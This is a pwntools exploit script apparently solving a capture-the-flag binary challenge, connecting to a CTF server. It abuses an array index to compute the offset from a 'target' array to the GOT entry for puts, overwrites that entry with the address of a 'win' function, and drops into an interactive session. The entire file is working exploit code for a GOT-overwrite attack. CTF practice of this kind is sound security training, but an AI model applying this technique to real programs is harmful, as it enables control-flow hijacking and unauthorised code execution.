from pwn import *

EXE = ELF("./challenge/chall_7")

context.binary = EXE
context.log_level = "DEBUG"
target_address = EXE.symbols['target']
win_address = EXE.symbols['win']
puts_got = EXE.got['puts']

def conn(useExe=False):
	if useExe:
		# r = gdb.debug(EXE.path, "\n".join(breakpoints))
		r = process([EXE.path])
	else:
		r = remote('pwn.osucyber.club',13378)
	return r

io = conn(False)

# Create a payload for idx, cakculated by finding the difference in 
# the address of `target` and the entry for `puts` in the global offset
# table in bytes, then dividing that by 8 because `target` is an array
# of longs, which are 8 bytes each.
payload = str((puts_got - target_address)//8).encode()
payload += b'\n'
io.send(payload)

# Create a payload for value
payload = str(win_address).encode()
payload += b'\n'
io.send(payload)
io.interactive()

io.close()